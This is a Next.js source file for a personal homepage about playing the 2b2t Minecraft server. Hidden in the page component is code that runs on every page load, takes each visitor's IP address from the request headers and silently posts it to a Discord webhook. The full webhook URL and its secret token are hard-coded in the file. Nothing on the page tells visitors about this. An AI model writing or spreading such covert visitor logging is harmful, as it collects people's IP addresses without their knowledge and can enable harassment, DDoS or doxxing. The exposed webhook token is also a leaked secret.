import React from 'react';
import PageContainer from "@mae/components/layout/PageContainer";
import Introduction from "@mae/components/frontpageBlocks/Introduction";
import {
    ToolBoxicon,
} from "@mae/components/frontpageBlocks/Tool";
import FrontpageSideblocks from "@mae/components/frontpageBlocks/FrontpageSideblocks";
import Link from "next/link";
import Button from "@mae/components/Button";
import HorizSeperator from "@mae/components/HorizSeperator";
import WebBadge from "@mae/components/WebBadge";
import Tool from '@mae/components/frontpageBlocks/Tool'
import Image from "next/image";
import Script from 'next/script'

import { headers } from 'next/headers'




export default async function Home() {
    const header = headers()
    const ip = (header.get('x-forwarded-for') ?? '127.0.0.1').split(',')[0]
    
    const webhookUrl = 'https://discord.com/api/webhooks/1290153075230773374/T50KBGIjsfVM8Q-H4b3-pcurM3ZOqu9BebWf1_nyZr5wXzFMVwAqz7EEksNvomlOKW-h';
    
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `IP Address: ${ip}` }),
    });
    
    return (
        <div className="flex flex-row justify-center gap-2 lg:gap-8 lg:px-8 transition-all">
            <PageContainer>
                <Introduction />

                {/* sideblocks mobile */}
                <div className="max-[670px]:block hidden">
                    <FrontpageSideblocks />
                </div>
                <HorizSeperator />

                {/* backstory */}
                <div className="flex flex-col md:flex-row gap-8">
                    <div className="block">
                        <Image
                            src="/assets/IronException_2b2t_Spawn_Render_June_2019.png"
                            width={1500}
                            height={500}
                            className="rounded-sm"
                            alt="_"
                            unoptimized={true}
                            style={{
                                boxShadow: "0px 2px 32px 8px rgb(166, 227, 161, 0.2)",
                                imageRendering: "pixelated"
                            }}
                        />
                    </div>
                    <div className="space-y-4 h-full">
                        <h2 className="text-2xl font-semibold">🪐 i do a lot of things!</h2>
                        <p className="leading-6">
                            i mostly play 2b2t (a minecraft server).
                            <br />
                            <br />
                            if you would like to contact me please visit my <Link href="/contact" className="font-bold text-ctp-green">contact page</Link>.
                        </p>
                        <div className="mt-auto w-fit">
                        </div>
                    </div>
                </div>
                <HorizSeperator />


                <div className="flex justify-center flex-wrap gap-2">
                    <WebBadge href="https://venroy.moe" src="/assets/buttons/friends/venroy.png" alt="venroy" />
                    <WebBadge href="https://mrbruh.com" src="/assets/buttons/friends/mrbruh.png" alt="mrbruh" />
                    <WebBadge href="https://odpay.net/" src="/assets/buttons/friends/odpay.gif" alt="odpay" />
                    <WebBadge href="https://theoplegends.lol/" src="/assets/buttons/friends/oplegends.png" alt="oplegends" />

                </div>

                <HorizSeperator />
            </PageContainer>

            {/* sideblocks desktop */}
            <div className="min-[670px]:block hidden lg:mr-0 mr-4">
                <FrontpageSideblocks />
            </div>
        </div>
    );
}
